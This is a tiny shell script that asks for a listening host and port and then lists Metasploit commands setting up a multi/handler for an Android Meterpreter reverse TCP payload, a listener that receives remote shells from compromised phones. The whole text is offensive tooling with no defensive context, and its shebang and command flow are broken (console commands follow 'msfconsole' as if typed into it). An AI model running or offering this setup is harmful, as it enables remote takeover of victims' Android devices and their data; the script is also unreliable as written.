#!/bash/sh
#use bash to use it

echo "enter lhost"
read lhost

echo "enter lport"
read lport

msfconsole
use multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST $lhost
set lport $lport
exploit

